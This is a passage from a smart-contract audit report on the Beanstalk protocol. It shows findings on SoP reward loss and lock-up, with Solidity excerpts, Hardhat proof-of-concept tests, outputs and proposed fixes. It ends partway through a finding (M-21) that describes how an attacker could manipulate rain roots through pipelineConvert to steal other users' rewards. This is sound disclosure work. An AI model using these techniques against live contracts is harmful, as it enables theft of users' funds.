    ) public payable fundsSafu noNetFlow noSupplyChange nonReentrant returns (uint256 _bdv) {
        //....
        LibSilo._mow(sender, token);
        // Need to update the recipient's Silo as well.
        LibSilo._mow(recipient, token);
        _bdv = _transferDeposit(sender, recipient, token, stem, amount);
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/silo/SiloFacet/SiloFacet.sol#L144-L146>

Since, it is raining, in the function `_mow`, the function `LibFlood.handleRainAndSops` is invoked.

```solidity
    function _mow(address account, address token) external {
        //.........
        uint32 currentSeason = s.sys.season.current;
        if (s.sys.season.rainStart > s.sys.season.stemStartSeason) {
            if (lastUpdate <= s.sys.season.rainStart && lastUpdate <= currentSeason) {
                // Increments `plenty` for `account` if a Flood has occured.
                // Saves Rain Roots for `account` if it is Raining.
                LibFlood.handleRainAndSops(account, lastUpdate);
            }
        }
        //......
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibSilo.sol#L438>

In the function `LibFlood.handleRainAndSops`, since sender has nonzero roots, and the flood is not happened, the body of the third if-clause will be executed, where the `lastRain` and `rainRoots` of the sender will be updated.

```solidity
    function handleRainAndSops(address account, uint32 lastUpdate) internal {
        //....
        if (s.sys.season.raining) {
            // If rain started after update, set account variables to track rain.
            if (s.sys.season.rainStart > lastUpdate) {
                s.accts[account].lastRain = s.sys.season.rainStart;
                s.accts[account].sop.rainRoots = s.accts[account].roots;
            }
            //.....
        }        
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L124-L127>

In the function `LibFlood.handleRainAndSops`, since receiver has zero roots, the body of first if-clause will be executed, where the `lastSop` of the receiver is updated to the rain start season.

```solidity
    function handleRainAndSops(address account, uint32 lastUpdate) internal {
        //....
        if (s.accts[account].roots == 0) {
            s.accts[account].lastSop = s.sys.season.rainStart;
            s.accts[account].lastRain = 0;
            return;
        }
        //....        
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L106-L109>

At the end of the transfer, only the deposited amount and stalks (germinating or active ones) are transferred from the sender to the receiver. Note that it is assumed that the sender has transferred all his amount to the receiver, so after the transfer, the sender does not hold any roots.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L356>
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibSilo.sol#L302>

**Thus, after the transfer, the `lastRain` and `rainRoots` of both the sender and the receiver will remain unchanged and will not be updated.**

If the next season is still rainy, leading to a flood, SoP rewards would be allocated to stakeholders at the beginning of the flood. Therefore, it is expected that the transferred roots should be entitled to SoP rewards, as those roots were created before the rainy season began.

After the flood, both the sender and the receiver call the `mow` function to update their state and determine whether any SoP rewards are allocated to them. Note that the sop reward is the oposite token of the bean in a well.

Since the sender does not hold any roots, the body of the first if-clause will be executed. Consequently, no SoP rewards are allocated to the sender, even though he has nonzero `rainRoots`.

```solidity
    function handleRainAndSops(address account, uint32 lastUpdate) internal {
        //....
        if (s.accts[account].roots == 0) {
            s.accts[account].lastSop = s.sys.season.rainStart;
            s.accts[account].lastRain = 0;
            return;
        }
        //....        
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L106-L109>

Regarding the receiver, since he has nonzero roots and `lastSopSeason` is higher than his `lastUpdateSeason`, the body of the second and third if-clauses will be executed.

```solidity
    function handleRainAndSops(address account, uint32 lastUpdate) internal {
        //....
        if (s.sys.season.lastSopSeason > lastUpdate) {
            address[] memory tokens = LibWhitelistedTokens.getWhitelistedWellLpTokens();
            for (uint i; i < tokens.length; i++) {
                s.accts[account].sop.perWellPlenty[tokens[i]].plenty = balanceOfPlenty(
                    account,
                    tokens[i]
                );
            }
            s.accts[account].lastSop = s.sys.season.lastSop;
        }
        //....
        if (s.sys.season.raining) {
            //....
            // If there has been a Sop since rain started,
            // save plentyPerRoot in case another SOP happens during rain.
            if (s.sys.season.lastSop == s.sys.season.rainStart) {
                address[] memory tokens = LibWhitelistedTokens.getWhitelistedWellLpTokens();
                for (uint i; i < tokens.length; i++) {
                    s.accts[account].sop.perWellPlenty[tokens[i]].plentyPerRoot = s.sys.sop.sops[
                        s.sys.season.lastSop
                    ][tokens[i]];
                }
            }
        }
        //....        
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L103>

Inside the function `balanceOfPlenty`, where it calculates how many SoP rewards are allocated to the receiver, since the receiver's `lastRain` is zero, the body of the else-clause will be executed. Additionally, because the `lastSop` is equal to the receiver's last update, the body of the second if-clause will not be executed. As a result, the variable `plenty`, which indicates the amount of reward allocated to the receiver, will be zero.

```solidity
    function balanceOfPlenty(address account, address well) internal view returns (uint256 plenty) {
       //....
       } else {
           // If it was not raining, just use the PPR at previous SOP.
           previousPPR = s.sys.sop.sops[s.accts[account].lastSop][well];
       }
       //...
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L172-L175>

Thus, neither the sender nor the receiver of the deposit are allocated the SoP rewards.

**The root cause of this issue is that when a deposit is transferred, the `rainRoots` and `lastRain` data are not transferred from the sender to the receiver, or are not updated accordingly.**

### Test Case

In the following test, user1 (sender) deposited and mowed in seasons 5 and 6, respectively. Then, there is rain in season 7. In this season, user1 transfers all his deposited amount to user2 (receiver). It shows that the sender's `lastRain` and `rainRoots` are equal to `7` and `2000000000000000000000`, respectively. While these two storage variables for the receiver are both equal to zero. Then, there is a flood in season 8, where both sender and receiver mow to update their states. It shows that `balanceOfPlenty` for both are zero, and when they call the function `claimPlenty`, they receive nothing.

```javascript
const { expect } = require("chai");
const { deploy } = require("../scripts/deploy.js");
const { EXTERNAL, INTERNAL, INTERNAL_EXTERNAL, INTERNAL_TOLERANT } = require("./utils/balances.js");
const {
  BEAN,
  BEAN_ETH_WELL,
  WETH,
  MAX_UINT256,
  ZERO_ADDRESS,
  BEAN_WSTETH_WELL,
  WSTETH
} = require("./utils/constants.js");
const { to18, to6, advanceTime } = require("./utils/helpers.js");
const { deployMockWell, whitelistWell, deployMockWellWithMockPump } = require("../utils/well.js");
const { takeSnapshot, revertToSnapshot } = require("./utils/snapshot.js");
const {
  setStethEthChainlinkPrice,
  setWstethEthUniswapPrice,
  setEthUsdChainlinkPrice
} = require("../utils/oracle.js");
const { getAllBeanstalkContracts } = require("../utils/contracts.js");

let user, user2, owner;

describe("Sop Test Cases", function () {
  before(async function () {
    [owner, user, user2] = await ethers.getSigners();

    const contracts = await deploy((verbose = false), (mock = true), (reset = true));
    ownerAddress = contracts.account;
    this.diamond = contracts.beanstalkDiamond;

    // `beanstalk` contains all functions that the regualar beanstalk has.
    // `mockBeanstalk` has functions that are only available in the mockFacets.
    [beanstalk, mockBeanstalk] = await getAllBeanstalkContracts(this.diamond.address);

    bean = await ethers.getContractAt("Bean", BEAN);
    this.weth = await ethers.getContractAt("MockToken", WETH);

    mockBeanstalk.deployStemsUpgrade();

    await mockBeanstalk.siloSunrise(0);

    await bean.connect(user).approve(beanstalk.address, "100000000000");
    await bean.connect(user2).approve(beanstalk.address, "100000000000");
    await bean.mint(user.address, to6("10000"));
    await bean.mint(user2.address, to6("10000"));

    // init wells
    [this.well, this.wellFunction, this.pump] = await deployMockWellWithMockPump();
    await deployMockWellWithMockPump(BEAN_WSTETH_WELL, WSTETH);
    await this.well.connect(owner).approve(this.diamond.address, to18("100000000"));
    await this.well.connect(user).approve(this.diamond.address, to18("100000000"));

    // set reserves at a 1000:1 ratio.
    await this.pump.setCumulativeReserves(this.well.address, [to6("1000000"), to18("1000")]);
    await this.well.mint(ownerAddress, to18("500"));
    await this.well.mint(user.address, to18("500"));
    await mockBeanstalk.siloSunrise(0);
    await mockBeanstalk.captureWellE(this.well.address);

    await setEthUsdChainlinkPrice("1000");
    await setStethEthChainlinkPrice("1000");
    await setStethEthChainlinkPrice("1");
    await setWstethEthUniswapPrice("1");

    await this.well.setReserves([to6("1000000"), to18("1100")]);
    await this.pump.setInstantaneousReserves(this.well.address, [to6("1000000"), to18("1100")]);

    await mockBeanstalk.siloSunrise(0); // 3 -> 4
    await mockBeanstalk.siloSunrise(0); // 4 -> 5

  });

  beforeEach(async function () {
    snapshotId = await takeSnapshot();
  });

  afterEach(async function () {
    await revertToSnapshot(snapshotId);
  });

  describe("transferring before flood scenario", async function () {

  it("transferring deposit loses the SoP rewards", async function () {
    console.log("current season: ", await beanstalk.season()); // 5

    const ret1 = await beanstalk.connect(user).callStatic.deposit(bean.address, to6("1000"), EXTERNAL);
    const depositedStem1 = ret1[2];

    await beanstalk.connect(user).deposit(bean.address, to6("1000"), EXTERNAL);

    await mockBeanstalk.siloSunrise(0); // 5 => 6

    await beanstalk.mow(user.address, bean.address);

    // rain starts in season 7
    await mockBeanstalk.rainSunrise(); // 6 => 7

    const rain = await beanstalk.rain();
    let season = await beanstalk.time();
    console.log("season.rainStart: ", season.rainStart);
    console.log("season.raining: ", season.raining);
    console.log("rain.roots: ", rain.roots);

    await beanstalk.connect(user).transferDeposit(user.address, user2.address, BEAN, depositedStem1, to6("1000"));

    let user1Rain = await beanstalk.balanceOfSop(user.address);
    console.log("user1.lastRain after transfer: ", user1Rain.lastRain);
    console.log("user1.rainRoots after transfer: ", user1Rain.roots);

    let user2Rain = await beanstalk.balanceOfSop(user2.address);
    console.log("user2.lastRain after transfer: ", user2Rain.lastRain);
    console.log("user2.rainRoots after transfer: ", user2Rain.roots);

    // there is a flood in season 8
    await mockBeanstalk.rainSunrise(); // 7 => 8

    await beanstalk.mow(user.address, bean.address);
    await beanstalk.mow(user2.address, bean.address);

    const balanceOfPlentyUser1 = await beanstalk.balanceOfPlenty(user.address, this.well.address);
    const balanceOfPlentyUser2 = await beanstalk.balanceOfPlenty(user2.address, this.well.address);

    console.log("user1's balanceOfPlenty: ", balanceOfPlentyUser1);
    console.log("user2's balanceOfPlenty: ", balanceOfPlentyUser2);

    await beanstalk.connect(user).claimPlenty(this.well.address, EXTERNAL);
    console.log("balance user1: ", await this.weth.balanceOf(user.address));

    await beanstalk.connect(user2).claimPlenty(this.well.address, EXTERNAL);
    console.log("balance user2: ", await this.weth.balanceOf(user2.address));
  });

})

```

The output is:

```Solidity
current season:  5
season.rainStart:  7
season.raining:  true
rain.roots:  BigNumber { value: "2000000000000000000000" }
user1.lastRain after transfer:  7
user1.rainRoots after transfer:  BigNumber { value: "2000000000000000000000" }
user2.lastRain after transfer:  0
user2.rainRoots after transfer:  BigNumber { value: "0" }
user1's balanceOfPlenty:  BigNumber { value: "0" }
user2's balanceOfPlenty:  BigNumber { value: "0" }
balance user1:  BigNumber { value: "0" }
balance user2:  BigNumber { value: "0" }
    ✔ transferring deposit loses the SoP rewards (128ms)
```

## Impact

* Loss of SoP rewards.
* When distributing SoP rewards, the allocation is based on the number of roots in the protocol, ensuring proportional distribution among stalk holders. However, if a transfer occurs during a rainy season, the rewards associated with those transferred roots become unclaimable by both the sender and receiver, effectively locking them within the protocol. Note that the reward is the oposite token of the bean in a well.

## Tools Used

## Recommendations

One possible solution could be to update the `lastRain` and `rainRoots` of the receiver based on the sender. However, this solution should be thoroughly tested in other scenarios to ensure it does not break any existing logic.

```solidity
    function transferStalk(address sender, address recipient, uint256 stalk) internal {
        //....

        s.accts[recipient].lastRain = s.accts[sender].lastRain;
        uint256 rainRoots;
        rainRoots = roots == s.accts[sender].roots
            ? s.accts[sender].sop.rainRoots
            : s.sys.rain.roots.sub(1).mul(roots).div(s.sys.silo.roots).add(1);
        s.accts[recipient].sop.rainRoots += rainRoots;
        s.accts[sender].sop.rainRoots -= rainRoots;
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibSilo.sol#L293>

## <a id='M-20'></a>M-20. Loss/lock of rewards in case of withdrawing fully before a flood

_Submitted by [fyamf](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Withdrawing a deposit entirely before a flood results in a situation where the SOP rewards held in the protocol become unclaimable and inaccessible. In other words, the user cannot claim their rewards, and the rewards will be permanently locked within the protocol.

## Vulnerability Details

When a new season is going to start, the function `handleRain` is called. The flow of function calls is as follows:

```Solidity
SeasonFacet::gm ==> Weather::calcCaseIdandUpdate ==> LibFlood::handleRain
```

In this function, if the condition for raining is met, the amount of roots in Silo will be set as rain roots. This means that at the time raining is going to start, how much roots are available in the Silo.

```Solidity
    function handleRain(uint256 caseId) external {
        //....
        s.sys.rain.roots = s.sys.silo.roots;
        //....
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L74>

If the condition for raining is still met, a flood will occur in the next season. In this case, when the `handleRain` function is called, the private function `sopWell` is triggered to mint beans and swap them for SOP tokens in the well.

```solidity
    function sopWell(WellDeltaB memory wellDeltaB) private {
        AppStorage storage s = LibAppStorage.diamondStorage();
        if (wellDeltaB.deltaB > 0) {
            IERC20 sopToken = LibWell.getNonBeanTokenFromWell(wellDeltaB.well);

            uint256 sopBeans = uint256(wellDeltaB.deltaB);
            C.bean().mint(address(this), sopBeans);

            // Approve and Swap Beans for the non-bean token of the SOP well.
            C.bean().approve(wellDeltaB.well, sopBeans);
            uint256 amountOut = IWell(wellDeltaB.well).swapFrom(
                C.bean(),
                sopToken,
                sopBeans,
                0,
                address(this),
                type(uint256).max
            );
            rewardSop(wellDeltaB.well, amountOut, address(sopToken));
            emit SeasonOfPlentyWell(
                s.sys.season.current,
                wellDeltaB.well,
                address(sopToken),
                amountOut
            );
        }
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L289>

Then, the private function `rewardSop` is called to assign PPR (plenty per root) to the rain start season. In other words, the amount of sop tokens (that are gained by swapping beans in the well) are divided by the amount of roots at the beginning of raining season to calculate PPR for the season when rain started.

```Solidity
    function rewardSop(address well, uint256 amount, address sopToken) private {
        AppStorage storage s = LibAppStorage.diamondStorage();
        s.sys.sop.sops[s.sys.season.rainStart][well] = s
        .sys
        .sop
        .sops[s.sys.season.lastSop][well].add(amount.mul(C.SOP_PRECISION).div(s.sys.rain.roots));

        s.sys.season.lastSop = s.sys.season.rainStart;
        s.sys.season.lastSopSeason = s.sys.season.current;

        // update Beanstalk's stored overall plenty for this well
        s.sys.sop.plentyPerSopToken[sopToken] += amount;
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L320>

Note that, these sop tokens are now held by Beanstalk, and users can claim them later by calling `claimPlenty`. To do so, users must first mow to update their state. Since, there was rain, the function `handleRainAndSops` would be called.

```solidity
    function _mow(address account, address token) external {
        //...
        uint32 currentSeason = s.sys.season.current;
        if (s.sys.season.rainStart > s.sys.season.stemStartSeason) {
            if (lastUpdate <= s.sys.season.rainStart && lastUpdate <= currentSeason) {
                // Increments `plenty` for `account` if a Flood has occured.
                // Saves Rain Roots for `account` if it is Raining.
                LibFlood.handleRainAndSops(account, lastUpdate);
            }
        }
        //...
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibSilo.sol#L438>

In this function, the internal function `balanceOfPlenty` would be invoked to calculate the amount rewards the users are allocated.

```solidity
    function handleRainAndSops(address account, uint32 lastUpdate) internal {
        //....
        if (s.sys.season.lastSopSeason > lastUpdate) {
            address[] memory tokens = LibWhitelistedTokens.getWhitelistedWellLpTokens();
            for (uint i; i < tokens.length; i++) {
                s.accts[account].sop.perWellPlenty[tokens[i]].plenty = balanceOfPlenty(
                    account,
                    tokens[i]
                );
            }
            s.accts[account].lastSop = s.sys.season.lastSop;
        }
        //.....
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L115>

In this function, based on the PPR calculated in the previous steps and the user's roots, the amount of plenty allocated to the user is calculated.

```solidity
    function balanceOfPlenty(address account, address well) internal view returns (uint256 plenty) {
        //.....
        if (s.sys.season.lastSop > s.accts[account].lastUpdate) {
            uint256 plentyPerRoot = s.sys.sop.sops[s.sys.season.lastSop][well].sub(previousPPR);
            plenty = plenty.add(plentyPerRoot.mul(s.accts[account].roots).div(C.SOP_PRECISION));
        }        
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L180>

The user can later call `claimPlenty` to receive the reward.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/silo/SiloFacet/ClaimFacet.sol#L65>

**The issue is that if the deposited amount is fully withdrawn before the flood, the SOP rewards allocated to stalkholders at the season when the rain started will be unreachable. In other words, those rewards will be locked in the protocol and cannot be withdrawn.**

For better understanding, please consider the following scenario:

Bob and Alice both deposits the equal amounts in season 5, and then they mowed in season 6. Due to a situation, it starts raining in season 7. When season 7 starts, the `s.sys.rain.roots` is set equal to `Bob's roots + Alice's roots` (assuming that only these two users have deposited for simplicity).

Then, Bob decides to withdraw fully in season 7, so the total roots in the Silo would be updated to `Alice's roots`. Suppose due to the situation, there will be again rain in the next season. So, there will be a flood in season 8. When the sop tokens are going to be rewarded, the amount of sop will be divided by the amount of roots when the rain started. So, we will have:\`

```solidity
s.sys.sop.sops[7][well] = amount of sop tokens / (Bob's roots + Alice's roots)
```

This shows that half of the SOP tokens are allocated to Bob and the other half to Alice. After mowing, both users should be able to claim their rewards by calling the function `claimPlenty`. The issue is that only half of the SOP tokens held in Beanstalk can be claimed by Alice. The other half is unreachable because Bob's roots are zero (as he fully withdrew). Therefore, when Bob mows, the function `handleRainAndSops` returns without assigning the reward to him.

```solidity
    function handleRainAndSops(address account, uint32 lastUpdate) internal {
        //....
        if (s.accts[account].roots == 0) {
            s.accts[account].lastSop = s.sys.season.rainStart;
            s.accts[account].lastRain = 0;
            return;
        }
        //....
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L106>

Note that Bob cannot deposit an amount and mow to gain nonzero roots in order to claim his reward. This is because each time deposit or mow is called, the user's last update season is refreshed, preventing them from fulfilling the following required condition.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibSilo.sol#L435>

### Test Case

In the following test, two users deposit and mow in season 5 and 6, respectively. Then rain starts in season 7. User1 withdraws his deposit fully in season 7. Then, there is a flood in season 8. It shows that due to the flood, `51191151829696906017` weth are transferred to Beanstalk. This amount is the reward, and they could be claimable by the users. So, both users mow, which shows that `balanceOfPlenty` for user1 and user2 are `0` and `25595575914848453008`, resepctively. It means that user1 is not allocated any reward. Note that, total reward is `51191151829696906017`, while only `25595575914848453008` is claimable by user2. So, the other half is locked in the protocol and unreachable.

Note that to run the test properly, the helper function `rainSunrise` in `MockSeasonFacet` should be corrected as follows:

```solidity
    function rainSunrise() public {
        require(!s.sys.paused, "Season: Paused.");
        s.sys.season.current += 1;
        s.sys.season.sunriseBlock = uint32(block.number);
        // update last snapshot in beanstalk.
        stepOracle();
        mockStartSop();

        // this code is added
        LibGerminate.endTotalGermination(
            s.sys.season.current,
            LibWhitelistedTokens.getWhitelistedTokens()
        );
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/mocks/mockFacets/MockSeasonFacet.sol#L95>

```javascript
// yarn hardhat test --grep "Sop Test Cases"

const { expect } = require("chai");
const { deploy } = require("../scripts/deploy.js");
const { EXTERNAL, INTERNAL, INTERNAL_EXTERNAL, INTERNAL_TOLERANT } = require("./utils/balances.js");
const {
  BEAN,
  BEAN_ETH_WELL,
  WETH,
  MAX_UINT256,
  ZERO_ADDRESS,
  BEAN_WSTETH_WELL,
  WSTETH
} = require("./utils/constants.js");
const { to18, to6, advanceTime } = require("./utils/helpers.js");
const { deployMockWell, whitelistWell, deployMockWellWithMockPump } = require("../utils/well.js");
const { takeSnapshot, revertToSnapshot } = require("./utils/snapshot.js");
const {
  setStethEthChainlinkPrice,
  setWstethEthUniswapPrice,
  setEthUsdChainlinkPrice
} = require("../utils/oracle.js");
const { getAllBeanstalkContracts } = require("../utils/contracts.js");

let user, user2, owner;

describe("Sop Test Cases", function () {
  before(async function () {
    [owner, user, user2] = await ethers.getSigners();

    const contracts = await deploy((verbose = false), (mock = true), (reset = true));
    ownerAddress = contracts.account;
    this.diamond = contracts.beanstalkDiamond;

    // `beanstalk` contains all functions that the regualar beanstalk has.
    // `mockBeanstalk` has functions that are only available in the mockFacets.
    [beanstalk, mockBeanstalk] = await getAllBeanstalkContracts(this.diamond.address);

    bean = await ethers.getContractAt("Bean", BEAN);
    this.weth = await ethers.getContractAt("MockToken", WETH);

    mockBeanstalk.deployStemsUpgrade();

    await mockBeanstalk.siloSunrise(0);

    await bean.connect(user).approve(beanstalk.address, "100000000000");
    await bean.connect(user2).approve(beanstalk.address, "100000000000");
    await bean.mint(user.address, to6("10000"));
    await bean.mint(user2.address, to6("10000"));

    // init wells
    [this.well, this.wellFunction, this.pump] = await deployMockWellWithMockPump();
    await deployMockWellWithMockPump(BEAN_WSTETH_WELL, WSTETH);
    await this.well.connect(owner).approve(this.diamond.address, to18("100000000"));
    await this.well.connect(user).approve(this.diamond.address, to18("100000000"));

    // set reserves at a 1000:1 ratio.
    await this.pump.setCumulativeReserves(this.well.address, [to6("1000000"), to18("1000")]);
    await this.well.mint(ownerAddress, to18("500"));
    await this.well.mint(user.address, to18("500"));
    await mockBeanstalk.siloSunrise(0);
    await mockBeanstalk.captureWellE(this.well.address);

    await setEthUsdChainlinkPrice("1000");
    await setStethEthChainlinkPrice("1000");
    await setStethEthChainlinkPrice("1");
    await setWstethEthUniswapPrice("1");

    await this.well.setReserves([to6("1000000"), to18("1100")]);
    await this.pump.setInstantaneousReserves(this.well.address, [to6("1000000"), to18("1100")]);

    await mockBeanstalk.siloSunrise(0); // 3 -> 4
    await mockBeanstalk.siloSunrise(0); // 4 -> 5

  });

  beforeEach(async function () {
    snapshotId = await takeSnapshot();
  });

  afterEach(async function () {
    await revertToSnapshot(snapshotId);
  });

  describe("flood scenarios", async function () {

  it("withdrawing before flood, locks the reward forever", async function () {
    console.log("current season: ", await beanstalk.season()); // 5

    const ret1 = await beanstalk.connect(user).callStatic.deposit(bean.address, to6("1000"), EXTERNAL);
    const depositedStem1 = ret1[2];

    await beanstalk.connect(user).deposit(bean.address, to6("1000"), EXTERNAL);

    await beanstalk.connect(user2).deposit(bean.address, to6("1000"), EXTERNAL);

    await mockBeanstalk.siloSunrise(0); // 5 => 6

    await beanstalk.mow(user.address, bean.address);
    await beanstalk.mow(user2.address, bean.address);

    // rain starts in season 7
    await mockBeanstalk.rainSunrise(); // 6 => 7


    const rain = await beanstalk.rain();
    let season = await beanstalk.time();
    console.log("season.rainStart: ", season.rainStart);
    console.log("season.raining: ", season.raining);
    console.log("rain.roots: ", rain.roots);

    await beanstalk.connect(user).withdrawDeposit(BEAN, depositedStem1, to6("1000"), EXTERNAL);

    // there is a flood in season 8
    await mockBeanstalk.rainSunrise(); // 7 => 8

    const protocolBalanceOfRewards = await this.weth.balanceOf(beanstalk.address);
    console.log("balance of protocol: ", protocolBalanceOfRewards);


    await beanstalk.mow(user.address, bean.address);
    await beanstalk.mow(user2.address, bean.address);

    const balanceOfPlentyUser1 = await beanstalk.balanceOfPlenty(user.address, this.well.address);
    const balanceOfPlentyUser2 = await beanstalk.balanceOfPlenty(user2.address, this.well.address);

    console.log("user1's balanceOfPlenty: ", balanceOfPlentyUser1);
    console.log("user2's balanceOfPlenty: ", balanceOfPlentyUser2);

    await beanstalk.connect(user).claimPlenty(this.well.address, EXTERNAL);
    console.log("balance user1: ", await this.weth.balanceOf(user.address));

    await beanstalk.connect(user2).claimPlenty(this.well.address, EXTERNAL);
    console.log("balance user2: ", await this.weth.balanceOf(user2.address));

    // protocolBalanceOfRewards is subtracted by one due to rounding.
    expect(BigInt(balanceOfPlentyUser1) + BigInt(balanceOfPlentyUser2)).to.be.equal(BigInt(protocolBalanceOfRewards) - BigInt(1));
  });

})

```

The output is:

```Solidity
current season:  5
season.rainStart:  7
season.raining:  true
rain.roots:  BigNumber { value: "4000000000000000000000" }
balance of protocol:  BigNumber { value: "51191151829696906017" }
user1's balanceOfPlenty:  BigNumber { value: "0" }
user2's balanceOfPlenty:  BigNumber { value: "25595575914848453008" }
balance user1:  BigNumber { value: "0" }
balance user2:  BigNumber { value: "25595575914848453008" }
    1) withdrawing before flood, locks the reward forever


  0 passing (9s)
  1 failing

  1) Sop Test Cases
       withdrawing before flood, locks the reward forever:

      AssertionError: expected 25595575914848453008n to equal 51191151829696906016n
      + expected - actual

      -25595575914848453008n
      +51191151829696906016n
```

## Impact

The rewards are locked in the protocol and will be unreachable. Note that the SOP reward is the opposite token of the bean in the well.

## Tools Used

## Recommendations

One possible solution is to modify the function `handleRainAndSops` as follows, where it checks `s.accts[account].sop.rainRoots == 0` as well as `s.accts[account].roots == 0`:

```solidity
    function handleRainAndSops(address account, uint32 lastUpdate) internal {
        //...
                if (s.accts[account].roots == 0 && s.accts[account].sop.rainRoots == 0) {            
            s.accts[account].lastSop = s.sys.season.rainStart;
            s.accts[account].lastRain = 0;
            return;
        }
        //...
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L106>

## <a id='M-21'></a>M-21. Stealing SoP rewards by manipulating the total rain roots during converting

_Submitted by [fyamf](https://profiles.cyfrin.io/u/undefined). Selected submission by: [fyamf](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

One can potentially hijack SoP rewards by manipulating the pipeline function calls during the conversion process.

## Vulnerability Details

* Suppose both Alice and Bob each deposit 2000e6 in season 1, and two seasons have elapsed, so we are now in season 3.
* Now, the conditions `P > 1  and podRate < 5% ` are met, so there will be rain in season 4.
* In season 3, the roots for both Bob and Alice are `20008000000000000000000000`, making the total roots `40016000000000000000000000`.
* Bob notices that when sunrise occurs and we step into the rainy season 4, the total rain roots (equal to the total roots before the rain) will be `40016000000000000000000000 `. Bob's rain roots will be `20008000000000000000000000`, the same as his roots before the rainy season 4. This means that if there is a flood in season 5, 50% of the rewards will be allocated to Bob and the other half to Alice, as each holds 50% of the total rain roots.
* Bob performs the following maneuver to increase his rain roots and thereby gain a larger share of the rewards.

Bob's trick:

* At the end of season 3 (i.e., after 1 hour has elapsed, allowing the transition to season 4 if someone calls `sunrise`), Bob calls `pipelineConvert` to convert Bean to LP tokens.
* During the conversion, the input tokens are first withdrawn. This action reduces temporarily the total roots in the protocol and sets Bob's roots to zero.
* Then it executes the pipilne convert where it uses the parameter `advancedFarmCalls`. This parameter is created such that it calls the function `advancedPipe` in `DepotFacet`, where it invokes the following series of functions by triggering the function `advancedPipe` in the `Pipeline` contract, in order:
  1. calls `sunrise` to step into rainy season 4.
  2. calls `approve` to give allowance of max to the BeanETH well to use the amount of bean transferred to the `Pipeline`.
  3. calls `addLiquidity` in BeanETH well to add those beans as liquidity.
  4. calls `run` in the contract `MaliciousContract`. This function only sows some beans in the protocol. The reason for having such function is that when `sunrise` is called, some beans are minted as incentivization to the caller. But, the function `advancePipe` has the modifier `noSupplyIncrease` to prevent any bean change in total supply. To bypass such limitation, the function `run` is called, it sows some beans equal to these newly minted beans into the protocol. By doing so, those sowed beans are burned, thus total supply of bean is not changed in `advancePipe`, and bypassing the limitation.
* When `sunrise` is called, it checks the condition for having rain in season 4. Since we assumed these conditions are met, the protocol sets `s.sys.rain.roots = s.sys.silo.roots` which means the total roots before the start of rain is equal to the current total roots in the protocol.
  * Note that, during convert, first the input tokens are withdrawn, so the total roots is decreased by the amount of roots that Bob was holding which is equal to `20008000000000000000000000`, thus the `s.sys.rain.roots` is set to `20008000000000000000000000` instead of `40016000000000000000000000`, and Bob's roots is set to `0`.
* After the execution of pipeline convert, output tokens (which is LP in this example) are added to the protocol and increases the total roots and Bob's roots by the quivalent roots based on the bdv of the output tokens, which is equal to `18578716386428000000000000` in this example. But, this does not change the `s.sys.rain.roots`.

In summary, before the convert (Bob's trick), we had:

* total roots = 40016000000000000000000000
* total rain roots: 0
* Alice's roots: 20008000000000000000000000
* Alice's rain roots: 0
* Bob's roots: 20008000000000000000000000
* Bob's rain roots: 0

After the convert (Bob's trick), we have:

* total roots = 38590716386428000000000000
* total rain roots: 20008000000000000000000000
* Alice's roots: 20012000000000000000000000
* Alice's rain roots: 20008000000000000000000000
* Bob's roots: 18578716386428000000000000
* Bob's rain roots: 18571291070000000000000000

The issue is that the total rain roots should equal the sum of Alice's and Bob's rain roots. However, it is smaller due to Bob's trick. In other words, Bob is holding 92% of the total rain roots (`18578716386428000000000000 / 20008000000000000000000000`), while Alice is holding 100% (`20008000000000000000000000 / 20008000000000000000000000`). This is problematic because Bob, being aware of the opportunity he created, can claim his rewards earlier than Alice. Therefore, if there is a flood in season 5 and rewards are allocated to Bob and Alice, Bob can call `claimPlenty` early and receive 92% of the rewards. Consequently, the total rain roots in the protocol decrease to `20008000000000000000000000 - 18578716386428000000000000 = 1.43670893e+24`. As a result, a low amount of rain roots remain in the protocol, and Alice cannot claim her rewards due to the underflow error in `s.sys.sop.plentyPerSopToken[address(sopToken)] -= plenty;`.

```solidity
    function _claimPlenty(address account, address well, LibTransfer.To toMode) internal {
